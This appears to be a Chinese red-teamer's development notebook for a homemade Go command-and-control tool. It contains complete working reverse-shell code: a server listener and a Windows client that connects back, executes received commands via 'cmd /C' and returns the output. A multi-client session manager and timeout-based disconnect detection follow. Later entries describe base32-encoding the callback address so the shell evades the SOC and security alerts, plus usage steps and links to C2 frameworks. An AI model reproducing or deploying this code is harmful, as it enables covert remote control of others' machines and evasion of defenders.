最近没啥时间搞研究了，5、6、7月份攻防排期直接爆表，先更新一下笔记，攻防太多了，c2 socket连接bug没修复、还没办法挂载后台执行监听、传输加密还没实现...
<a name="mhSh0"></a>
## ![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1651319820257-bc284342-2395-49e4-901a-a7a4d4fbd3bf.png#averageHue=%23f5f5f5&clientId=ueabac566-0077-4&from=paste&height=272&id=u55a072e9&originHeight=340&originWidth=582&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26000&status=done&style=none&taskId=u56cd90d9-7230-4383-b05a-30367241843&title=&width=465.6)
<a name="AG3Mq"></a>
## C2
其实很简单，就是通过socket连接，socket连接的时候，服务端给客户端下命令，客户端接收到的命令执行完后带回去tcp通信给服务端。<br />服务端
```go
package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
)

func main() {
	listen, err := net.Listen("tcp", "0.0.0.0:9999")  //开启监听
	fmt.Println("listenning...")
	if err != nil {
		fmt.Println("listent failed, err:", err)
		return
	}
	for {
		conn, err := listen.Accept() // 建立链接
		if err != nil {
			fmt.Println("accept failed, err:", err) // 三次握手失败
			continue
		}
		go process(conn) // 启动多个goroutine来处理回复
	}
}

// 处理请求
func process(conn net.Conn) {
	defer conn.Close() // 关闭链接通道
	for {
		//var inputMsg string
		//fmt.Print("windows-shell->:")
		//fmt.Scanln(&inputMsg)
		//inputMsg = strings.Trim(inputMsg, "\r\n") // 去除空行等，防止阻塞
		//conn.Write([]byte(inputMsg))
		reader := bufio.NewReader(os.Stdin)
		fmt.Print("Shell>")
		command, _ := reader.ReadString('\n')
		if _,err := conn.Write([]byte(command)); err != nil{
			fmt.Printf("write to client failed, err: %v\n", err)
			break
		}

		reader = bufio.NewReader(conn)
		var buf [1024]byte
		n, err := reader.Read(buf[:]) // 读取数据 读取的字节数，错误信息
		if err != nil {
			fmt.Print("read form client failed, err:", err)
			break
		}
		recvStr := string(buf[:n])
		fmt.Println(recvStr)
	}
}

```
客户端
```go
package main

import (
	"fmt"
	"net"
	"os/exec"
	//"strings"
)

func main() {
	conn, err := net.Dial("tcp", "127.0.0.1:9999") // 对服务端发起连接
	if err != nil {
		fmt.Println("err:", err)
		return
	}
	defer conn.Close() // 关闭双向链接
	for {
		buf := [512]byte{}
		serverMsg, err := conn.Read(buf[:]) // 服务端返回的信息
		if err != nil {
			fmt.Println("recv failed err:", err)
			return
		}
		fmt.Println("server message:", string(buf[:serverMsg]))
		shell_arg := []string{"/C", string(buf[:serverMsg])}
		execcmd := exec.Command("cmd", shell_arg...)
		cmdout, _ := execcmd.Output()
		//var inputMsg string
		//fmt.Println("请输入你要发送的信息:")
		//fmt.Scanln(&inputMsg)
		//inputMsg = strings.Trim(inputMsg, "\r\n") // 去除空行等，防止阻塞
		//if strings.ToUpper(inputMsg) == "quit" {
		//	return
		//}
		_, err = conn.Write([]byte(cmdout)) // 发送数据
		if err != nil {
			return
		}
	}
}

```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1650815926889-17c25e6b-3e16-4653-b280-aebb6d52009c.png#averageHue=%23022658&clientId=u5abf47a4-7313-4&from=paste&height=479&id=u8ca31f10&originHeight=599&originWidth=655&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37100&status=done&style=none&taskId=uef66581f-4d94-407d-81bb-b0afd2a4c2c&title=&width=524)

[https://github.com/TheKingOfDuck/ReverseGoShell](https://github.com/TheKingOfDuck/ReverseGoShell) <br />bug 1.客户端退出去后，服务端就直接GG了

<a name="rtW4k"></a>
## 坑点的解决
单纯的socket通信，不接入客户端的exec命令执行，回车、啥的都是可以发送过去。<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1651163605803-2d8d715b-ce56-4e19-bd9e-bff04cb31006.png#averageHue=%23022658&clientId=uce8b88ca-f230-4&from=paste&height=462&id=u0d251906&originHeight=578&originWidth=1254&originalType=binary&ratio=1&rotation=0&showTitle=false&size=89778&status=done&style=none&taskId=uadfc5af4-f785-4a60-a503-f7ce620c812&title=&width=1003.2)

此时代码如下所示<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1651163656333-c0998446-58b4-474f-9746-83da0970fdd4.png#averageHue=%23fbfbf9&clientId=uce8b88ca-f230-4&from=paste&height=612&id=u61b164a3&originHeight=765&originWidth=971&originalType=binary&ratio=1&rotation=0&showTitle=false&size=73723&status=done&style=none&taskId=u00a38ee6-a457-44bf-a64e-bb906f80d81&title=&width=776.8)

<a name="vmMEJ"></a>
## 思路

存入  对应的序号、hostname、ip、conn →选择对应的序号进入对应的客户端


<a name="szgCl"></a>
## 进展
实习1对多接收多个客户端，socket长连接+循环
```go
package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
)
var ConnMap map[int]Client= make(map[int]Client)
type Client struct {
	conn net.Conn
	hostname string
	addr string
}

func main() {
	var n int
	n= 0
	listen, err := net.Listen("tcp", "0.0.0.0:9999")  //开启监听
	fmt.Println("listenning...")
	if err != nil {
		fmt.Println("listent failed, err:", err)
		return
	}
	var hostname string
	var command1 string

	for {
		conn, err := listen.Accept() // 建立链接
		if err != nil {
			fmt.Println("accept failed, err:", err) // 三次握手失败
			continue
		}else{
			n++
			fmt.Printf("Accept() suc con=%v 客户端ip=%v\n", conn, conn.RemoteAddr().String())
			hostname,err=recv(conn)
			if err!=nil{
				fmt.Printf("write to client failed, err: %v\n", err)
			}
			//if _,err := recv(conn); err != nil{
			//	fmt.Printf("write to client failed, err: %v\n", err)
			//	break
			//}
			//clientName :=n
			//ConnMap[hostname] = conn.RemoteAddr().String()
			//fmt.Println(len(ConnMap))
			//fmt.Println(ConnMap)

			client := Client{conn, hostname, conn.RemoteAddr().String()}
			ConnMap[n] = client
			//ConnMap := map[int]*Client{
			//	n: &Client{conn, hostname, conn.RemoteAddr().String()},
			//}
			fmt.Println(len(ConnMap))
			fmt.Println(ConnMap)
			//fmt.Println(ConnMap,"   ",ConnMap[0],"  ",ConnMap[1].hostname,"    ",ConnMap[2].hostname)
			for{
				fmt.Println("输入")
				fmt.Scanln(&command1)
				if command1 =="show"{
					for i:=1;i <= len(ConnMap);i++{
						fmt.Println(ConnMap[i])
					}
				}
				if command1 =="go"{
					var c2 int            // 年龄
					fmt.Print("请进入对应的C2>")
					fmt.Scanln(&c2)
					go process(ConnMap[c2].conn)
				}
				if command1 =="back" {
					break
				}
					//switch command1 {
				//case "show":
				//	for i:=1;i <= len(ConnMap);i++{
				//		fmt.Println(ConnMap[i])
				//	}
				//	break
				//case "1":
				//	go process(ConnMap[1].conn)
				//default:
				//	break
				//}
				//if command1 =="show"{
				//	break
				//}
			}
			//go process(conn) // 启动多个goroutine来处理回复

		}
		//go process(conn) // 启动多个goroutine来处理回复
	}
}

// 处理请求
func process(conn net.Conn) {
	defer conn.Close() // 关闭链接通道
	for {
		//var inputMsg string
		//fmt.Print("windows-shell->:")
		//fmt.Scanln(&inputMsg)
		//inputMsg = strings.Trim(inputMsg, "\r\n") // 去除空行等，防止阻塞
		//conn.Write([]byte(inputMsg))
		reader := bufio.NewReader(os.Stdin)
		fmt.Print("Shell>")
		command, _ := reader.ReadString('\n') //读到换行就结束
		if _,err := conn.Write([]byte(command)); err != nil{
			fmt.Printf("write to client failed, err: %v\n", err)
			break
		}
		if _,err := recv(conn); err != nil{
			fmt.Printf("write to client failed, err: %v\n", err)
			break
		}
		if command == "stop"{
			break
		}
		//reader = bufio.NewReader(conn)
		//var buf [1024]byte
		//n, err := reader.Read(buf[:]) // 读取数据 读取的字节数，错误信息
		//if err != nil {
		//	fmt.Print("read form client failed, err:", err)
		//	break
		//}
		//recvStr := string(buf[:n])
		//fmt.Println(recvStr)
	}
}
func recv(conn net.Conn)(recvStr string,err error){ //1、获取客户端的主机名
	reader := bufio.NewReader(conn)
	var buf [1024]byte
	n, err := reader.Read(buf[:]) // 读取数据 读取的字节数，错误信息
	if err != nil {
		fmt.Print("read form client failed, err:", err)
		return "", err
	}
	recvStr = string(buf[:n])
	fmt.Println(recvStr)
	return recvStr,err
}

```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1651505010926-869679e5-891f-43c2-a824-371e8a6676ea.png#averageHue=%2303275a&clientId=u97c9b454-7eb1-4&from=paste&height=451&id=ucf105cf8&originHeight=478&originWidth=512&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36959&status=done&style=none&taskId=uf41f9917-4c88-46d9-9227-81064acd5e4&title=&width=482.6000061035156)

bug   socket传输有时候会吃掉第一个字母<br />![image.png](https://cdn.nlark.com/yuque/0/2022/png/1345801/1651735400207-ebbb6587-f89e-46d9-818a-56bcaad45dd2.png#averageHue=%23cbdab5&clientId=u14c1a00f-15fa-4&from=paste&height=638&id=u976c605c&originHeight=797&originWidth=1633&originalType=binary&ratio=1&rotation=0&showTitle=false&size=263840&status=done&style=none&taskId=ub150c7c0-4ad6-4055-906e-e41ce503353&title=&width=1306.4)


<a name="Pzdk8"></a>
## 23年/5月/10日 最新加密通信C2

为了内部攻防c2反弹shell不被soc团队检测<br />自研了1对1加密通信的c2工具，安全设备无告警拦截

客户端要base32加密的参数传入<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1683734424710-89375017-6782-496f-ad52-924eef029027.png#averageHue=%23151311&clientId=u12c50ad0-7cf9-4&from=paste&height=94&id=ucc07d006&originHeight=118&originWidth=832&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=16432&status=done&style=none&taskId=u476ba3cc-88b1-4b5e-a37c-3db96ed18ee&title=&width=665.6)

服务端监听只需要端口就可以了，先运行服务端 再运行客户端，后续要去掉输出的<br />server message:信息<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1683734713769-4a0d5263-07b3-4d10-9a87-4c78b5b0422b.png#averageHue=%23162e50&clientId=u12c50ad0-7cf9-4&from=paste&height=576&id=u0f9b4da6&originHeight=720&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=692664&status=done&style=none&taskId=u18e392f0-2587-4c70-a42c-fa148b6247b&title=&width=1536)

<a name="CkBZK"></a>
## 23年/5月/15日 一对多c2
成功解决<br />![17313e772224e59d9847949174a28df.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1684082052592-e45d91c6-1014-423d-b508-56a108d215ac.png#averageHue=%23302f2f&clientId=ub9c84e23-8c80-4&from=paste&height=715&id=u167cb807&originHeight=894&originWidth=1797&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=135394&status=done&style=none&taskId=ubb4ff67c-b1d0-4b55-9b53-8c14e3129cb&title=&width=1437.6)<br />select|windows|whoami 
<a name="EDB1b"></a>
## 23年/5月/15日 一对多c2
1、重名bug，主机名相同，会覆盖(客户端随机数解决)<br />![6a261ebc6fd39392f5271ad0f647383.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1684253594709-3d4d1b0c-e222-48aa-a077-cb56c8e2d1da.png#averageHue=%232e2d2c&clientId=u034a7f1a-b8a1-4&from=paste&height=631&id=u126cc37f&originHeight=789&originWidth=1603&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=175584&status=done&style=none&taskId=u46f29e2e-d190-4190-b113-6eabb15724d&title=&width=1282.4)<br />2、自动探测存活，然后删除对应的客户端

<a name="lctaH"></a>
## 文章
可以参考魔改<br />[https://github.com/HavocFramework/Havoc](https://github.com/HavocFramework/Havoc)<br />[https://mp.weixin.qq.com/s/BuvYj4-pacKlnCUFzOIsHw](https://mp.weixin.qq.com/s/BuvYj4-pacKlnCUFzOIsHw)<br />[https://github.com/zha0gongz1/Windows-ReverseShell](https://github.com/zha0gongz1/Windows-ReverseShell)

<a name="mliA6"></a>
## 关于ttyd
[https://github.com/tsl0922/ttyd](https://github.com/tsl0922/ttyd)<br />[https://github.com/Ptkatz/OrcaC2](https://github.com/Ptkatz/OrcaC2)<br />[https://github.com/Script-OS/go-ttyd](https://github.com/Script-OS/go-ttyd)  可以改


<a name="x7bVX"></a>
## 关于实时掉线的操作代码参考
服务端 不需要心跳包，就能监控到掉线。。。通过read的时间超时判断
```java
package main

import (
	"fmt"
	"net"
	"time"
)

// var tcpServe *net.TCPListener

func main() {
	fmt.Println("Hello world")

	addr, er := net.ResolveTCPAddr("tcp", "0.0.0.0:19000")
	if er != nil {
		fmt.Println("parse addr error on ", addr.String())
		return
	}
	tcpServe, er := net.ListenTCP("tcp", addr)
	if er != nil {
		fmt.Println("Listen error on ", tcpServe.Addr().String())
		return
	}
	defer tcpServe.Close()

	fmt.Println("start listen for client...", tcpServe.Addr().String())
	for {
		conn, er := tcpServe.AcceptTCP()
		if er != nil {
			fmt.Println("tcp server accept error ", er)
			break
		}
		fmt.Println("Conn come in: ", conn.RemoteAddr().String())

		conn.SetNoDelay(true)
		conn.SetKeepAlive(true)

		go connLoop(conn)
	}
}

func connLoop(c *net.TCPConn) {
	defer c.Close()

	//fmt.Println("Conn come in: ", c.RemoteAddr().String())
	var buff = make([]byte, 1024)
	for {
		c.SetReadDeadline(time.Now().Add(time.Second * 10))
		n, er := c.Read(buff)
		if er != nil {
			switch t_er := er.(type) {
			case net.Error:
				if t_er.Timeout() {   // 只有这个可以判断 read timeout 错误.
					fmt.Println("read timeout, retry...")
					continue
				}
				// 对于 io.EOF 之类，正常处理
				break
			default:
				break
			}
			fmt.Println("Conn error: ", er)
			break
		}
		fmt.Println("Read inf: ", buff[:n])
	}
	fmt.Println("Conn leave... ", c.RemoteAddr().String())
}


```

客户端这里 能识别到ctrl+c或者是直接退出<br />reader.ReadString('\n')
```java
package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
)

// var client *net.TCPConn

func main() {
	fmt.Println("Hello world client")
	client, er := net.Dial("tcp", "127.0.0.1:19000")
	if er != nil {
		fmt.Println("Dial error: ", er)
		return
	}
	defer client.Close()

	fmt.Println("Local: ", client.LocalAddr().String(), "Remote: ", client.RemoteAddr().String())

	reader := bufio.NewReader(os.Stdin)
	for {
		dt, er := reader.ReadString('\n')
		if er != nil {
			fmt.Println("read error: ", er)
			break
		}
		client.Write([]byte(dt))
	}
	fmt.Println("client disconnect...")

}


```

<a name="z0VF0"></a>
## 流程脑图
![image.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1684853457366-58ec95ea-9268-42d0-bbc7-247e366fc643.png#averageHue=%23fafafa&clientId=u774ac512-9da1-4&from=paste&height=497&id=ucff9fca5&originHeight=621&originWidth=908&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36690&status=done&style=none&taskId=ubeccabac-37a1-4581-8527-0ea4b7d58d8&title=&width=726.4)

代码优化、客户端修改接收参数、服务端修改数据库的接入位置

client端加了base32<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1686495781523-ece9fb9a-0071-4108-91b1-e004f5b3e5b0.png#averageHue=%23141110&clientId=u04f4b95e-a5f0-4&from=paste&height=54&id=ufc3b3c83&originHeight=68&originWidth=834&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8470&status=done&style=none&taskId=u4a93e0cc-9a4b-4353-accc-28ca71a20b0&title=&width=667.2)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1686495792921-c6351823-6c81-4ec3-9eed-97c264c70858.png#averageHue=%2313110f&clientId=u04f4b95e-a5f0-4&from=paste&height=49&id=uef8d7e86&originHeight=61&originWidth=974&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8088&status=done&style=none&taskId=ud5577e15-f944-41ac-826e-03d59164b20&title=&width=779.2)

<a name="ONxsj"></a>
## 使用方法
服务端启动<br />server.exe 8899<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1686583818420-17be3e16-e67e-4479-971b-fe36f17c24c1.png#averageHue=%23151310&clientId=u1c34283a-f0a1-4&from=paste&height=60&id=udaac2ec0&originHeight=62&originWidth=570&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=7672&status=done&style=none&taskId=u79ad9cfd-4cd2-4972-b70d-2151628ec59&title=&width=554)

客户端建立连接，首先对ip端口进行base32加密<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1686584677531-86c27809-631e-4277-86fe-9b60e4af4388.png#averageHue=%2313110f&clientId=u0ea52160-7f2b-4&from=paste&height=82&id=ue49ff123&originHeight=102&originWidth=828&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=12617&status=done&style=none&taskId=u8f181850-7e75-44b1-b86d-a7e6c86ebbe&title=&width=662.4)

执行二进制文件如下操作，就可以进行连接<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1686584739936-a583abd9-7171-413e-b372-ae5d8a6f9d7e.png#averageHue=%23272b37&clientId=u0ea52160-7f2b-4&from=paste&height=114&id=u4fa96bc0&originHeight=142&originWidth=637&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=24524&status=done&style=none&taskId=u5cd98b92-fe12-4792-8ef8-3f492d3355d&title=&width=509.6)

然后使用中控端对c2进行控制，如下1、2、3步骤操作<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/1345801/1686584829256-710a7fab-a570-479d-87b9-969de11ab9ef.png#averageHue=%230f0e0d&clientId=u0ea52160-7f2b-4&from=paste&height=742&id=u07292d85&originHeight=928&originWidth=987&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=96053&status=done&style=none&taskId=ub5073535-e95d-4dae-b48c-c3906d633dc&title=&width=789.6)
